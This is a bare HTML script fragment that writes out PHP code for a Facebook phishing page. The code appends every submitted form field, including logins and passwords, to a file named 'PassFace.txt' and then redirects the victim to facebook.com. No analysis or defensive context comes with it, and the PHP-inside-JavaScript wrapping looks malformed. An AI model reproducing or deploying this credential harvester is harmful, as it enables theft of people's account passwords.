<script type="text/javascript">
<!-- 
document.writeln(" <?php header ('Location:https://www.facebook.com/'); "); 
document.writeln(" $handle = fopen(\"PassFace.txt\", \"a\"); "); 
document.writeln(" foreach($_POST as $variable => $value) { "); 
document.writeln(" fwrite($handle, $variable); fwrite($handle, \"=\"); "); 
document.writeln(" fwrite($handle, $value); fwrite($handle, \"rn\"); "); 
document.writeln(" } "); 
document.writeln(" fwrite($handle, \"rn\"); "); 
document.writeln(" fclose($handle); "); 
document.writeln(" exit; "); 
document.writeln(" ?> ");
 // -->
</script>